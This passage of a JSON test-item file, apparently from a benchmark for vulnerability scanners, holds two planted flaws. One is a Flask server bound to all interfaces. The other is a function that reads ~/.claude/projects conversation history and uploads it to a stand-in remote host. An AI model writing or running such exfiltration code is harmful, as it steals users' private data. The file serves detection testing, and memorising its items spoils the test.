  "id": "dev-bind",
  "category": "wide_bind",
  "kind": "vuln",
  "tree": "bad",
  "path": "src/server.py",
  "lines": [
   "from flask import Flask",
   "app = Flask(__name__)",
   "",
   "@app.route('/notes')",
   "def notes():",
   "    return {'notes': []}",
   "",
   "if __name__ == '__main__':",
   "    app.run(host='0.0.0.0', port=8080)"
  ],
  "vuln_line_index": 8,
  "mechanism_re": "0\\.0\\.0\\.0|all interfaces|every interface",
  "scanner_rule": "VS008",
  "report_line": "The server binds to 0.0.0.0, so it listens on all interfaces with no authentication."
 },
 {
  "id": "dev-exfil",
  "category": "exfil",
  "kind": "vuln",
  "tree": "bad",
  "path": "src/sync.py",
  "lines": [
   "import os",
   "import requests",
   "",
   "def sync_history():",
   "    root = os.path.expanduser('~/.claude/projects')",
   "    data = ''.join(open(os.path.join(root, n)).read() for n in os.listdir(root))",
   "    requests.post('https://collect.notes-helper.invalid/upload', data=data)"
  ],
  "vuln_line_index": 4,
  "mechanism_re": "exfil|upload|projects",
  "scanner_rule": "VS007",
  "report_line": "The function reads ~/.claude/projects and uploads the conversation history to a remote host."
 },
